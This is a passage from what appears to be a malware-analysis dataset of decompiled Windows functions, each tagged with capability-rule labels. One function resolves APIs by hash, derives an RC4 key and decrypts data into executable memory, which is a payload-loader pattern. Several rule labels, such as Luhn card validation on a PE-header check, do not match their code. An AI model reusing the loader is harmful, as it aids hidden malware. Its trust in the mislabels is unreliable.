0)) {\n        piVar10 = 0x417790;\n        if (*0x41778c == 0) {\n            piVar11 = piVar10;\n            if ((*0x417790 != 0) || (piVar11 = 0x417790,  *0x417794 != 0)) goto code_r0x0040313e;\n        }\n        else {\n            piVar10 = 0x417784;\n        }\n        pcVar6 = piVar10[2];\n        if (pcVar6 != 0x1) {\ncode_r0x004032f3:\n            ppcVar15[1] = pcVar6;\n            *ppcVar15 = \"  Unknown pseudo relocation protocol version %d.\\n\";\n            ppcVar15[-1] = 0x403303;\n            fcn.00402d90();\n            return;\n        }\n        piVar10 = piVar10 + 3;\n        if (0x41779b < piVar10) {\n            *0x4182f0 = NULL;\n            return;\n        }\n        do {\n            iVar5 = *piVar10;\n            iVar3 = *(iVar5 + 0x400000);\n            piVar11 = piVar10[1] + 0x400000;\n            uStack184 = iVar3;\n            uVar7 = *(piVar10 + 2);\n            if (uVar7 == 0x10) {\n                uVar2 = *(piVar10[1] + 0x400000);\n                uVar7 = uVar2;\n                if (uVar2 < 0) {\n                    uVar7 = uVar2 | 0xffff0000;\n                }\n                uStack184 = aiStack176;\n                aiStack176[0] = iVar3 + (uVar7 - iVar5) + -0x400000;\n                *(&pcStack212 + iVar8 + -4) = 0x40325d;\n                fcn.00402df0();\n            }\n            else if (uVar7 == 0x20) {\n                uStack184 = aiStack176;\n                aiStack176[0] = (iVar3 - (iVar5 + 0x400000)) + *piVar11;\n                *(&pcStack212 + iVar8 + -4) = 0x4032cc;\n                fcn.00402df0();\n            }\n            else {\n                if (uVar7 != 8) {\n                    *(&pcStack212 + iVar8 + 4) = uVar7;\n                    *(&pcStack212 + iVar8) = \"  Unknown pseudo relocation bit size %d.\\n\";\n                    aiStack176[0] = 0;\n                    *(&pcStack212 + iVar8 + -4) = 0x403131;\n                    fcn.00402d90();\n                    return;\n                }\n                uVar1 = *piVar11;\n                uVar7 = uVar1;\n                if (uVar1 < '\\0') {\n                    uVar7 = uVar1 | 0xffffff00;\n                }\n                uStack184 = aiStack176;\n                aiStack176[0] = iVar3 + ((uVar7 - 0x400000) - iVar5);\n                *(&pcStack212 + iVar8 + -4) = 0x4032a7;\n                fcn.00402df0();\n            }\n            piVar10 = piVar10 + 3;\n        } while (piVar10 < 0x41779c);\n    }\n    else {\n        piVar11 = 0x417784;\ncode_r0x0040313e:\n        if (0x41779b < piVar11) {\n            *0x4182f0 = NULL;\n            return;\n        }\n        uStack184 = aiStack176;\n        do {\n            piVar10 = piVar11 + 2;\n            aiStack176[0] = *(piVar11[1] + 0x400000) + *piVar11;\n            *(&pcStack212 + iVar8 + -4) = 0x403175;\n            fcn.00402df0();\n            piVar11 = piVar10;\n        } while (piVar10 < 0x41779c);\n    }\n    iVar8 = 0;\n    if (0 < *0x4182f0) {\n        do {\n            piVar11 = uStack184;\n            piVar10 = *0x4182f4 + iVar8 * 0xc;\n            if (*piVar10 != 0) {\n                piVar14[2] = 0x1c;\n                piVar14[1] = piVar11;\n                *piVar14 = piVar10[1];\n                piVar12 = piVar14 + -1;\n                piVar14[-1] = 0x4031cd;\n                iVar5 = (*_sym.imp.KERNEL32.dll_VirtualQuery)();\n                ppcVar15 = piVar12 + -3;\n                if (iVar5 == 0) {\n                    iVar8 = *0x4182f4 + iVar8 * 0xc;\n                    piVar12[-1] = *(iVar8 + 4);\n                    iVar8 = *(*(iVar8 + 8) + 8);\n                    piVar12[-3] = \"  VirtualQuery failed for %d bytes at address %p\";\n                    piVar12[-2] = iVar8;\n                    piVar12[-4] = 0x4032f3;\n                    pcVar6 = fcn.00402d90();\n                    goto code_r0x004032f3;\n                }\n                *piVar12 = auStack180;\n                piVar12[-1] = *(*0x4182f4 + iVar8 * 0xc);\n                piVar12[-2] = iStack164;\n                piVar12[-3] = aiStack176[0];\n                piVar13 = piVar12 + -4;\n                piVar12[-4] = 0x4031fe;\n                (*_sym.imp.KERNEL32.dll_VirtualProtect)();\n                piVar14 = piVar13 + -0x10;\n            }\n            iVar8 = iVar8 + 1;\n        } while (iVar8 < *0x4182f0);\n    }\n    return;\n}\n",
        "token_count": 3209
    },
    "00403750": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool fcn.00403750(void)\n\n{\n    int32_t in_EAX;\n    int32_t *piVar1;\n    \n    piVar1 = in_EAX + *(in_EAX + 0x3c);\n    if (*piVar1 != 0x4550) {\n        return false;\n    }\n    return *(piVar1 + 6) == 0x10b;\n}\n",
        "token_count": 87
    },
    "00403790": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "contain loop",
            "enumerate PE sections"
        ],
        "decompiled_code": "\nint32_t fcn.00403790(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    param_1 = param_1 + *(param_1 + 0x3c);\n    iVar1 = param_1 + 0x18 + *(param_1 + 0x14);\n    if (*(param_1 + 6) != 0) {\n        uVar2 = 0;\n        do {\n            if ((*(iVar1 + 0xc) <= param_2) && (param_2 < *(iVar1 + 0xc) + *(iVar1 + 8))) {\n                return iVar1;\n            }\n            uVar2 = uVar2 + 1;\n            iVar1 = iVar1 + 0x28;\n        } while (uVar2 < *(param_1 + 6));\n    }\n    return 0;\n}\n",
        "token_count": 204
    },
    "00402670": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint __cdecl fcn.00402670(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    code *pcVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    code *pcVar7;\n    int32_t iVar8;\n    uint uVar9;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_38h;\n    uint var_28h;\n    uint var_bp_ch;\n    \n    pcVar1 = fcn.00402360(0x5339d538);\n    pcVar2 = fcn.00402360(0xe67961f6);\n    pcVar3 = fcn.00402360(0xadb4002d);\n    pcVar4 = fcn.00402360(0xbf2a187e);\n    pcVar5 = fcn.00402360(0x4d4b5910);\n    pcVar6 = fcn.00402360(0xb36695e0);\n    pcVar7 = fcn.00402360(0x56588c7b);\n    iVar8 = (*pcVar3)(&var_48h, 0, 0, 1, 0);\n    if (((iVar8 == 0) && (iVar8 = (*pcVar3)(&var_48h, 0, 0, 1, 8),  iVar8 == 0)) &&\n       (iVar8 = (*pcVar3)(&var_48h, 0, 0, 1, 0xf0000000),  iVar8 == 0)) {\n        return 0;\n    }\n    iVar8 = (*pcVar5)(var_48h, 0x8003, 0, 0, &var_38h);\n    if (((iVar8 != 0) && (iVar8 = (*pcVar6)(var_38h, arg_10h, 0x10, 1),  iVar8 != 0)) &&\n       (iVar8 = (*pcVar7)(var_48h, 0x6801, var_38h, 1, &var_28h),  iVar8 != 0)) {\n        uVar9 = (*pcVar2)(0, arg_ch, 0x1000, 0x40);\n        (*pcVar1)(uVar9, arg_8h, arg_ch);\n        iVar8 = (*pcVar4)(var_28h, 0, 1, 0, uVar9, &arg_ch, arg_ch);\n        if (iVar8 != 0) {\n            return uVar9;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 646
    }
}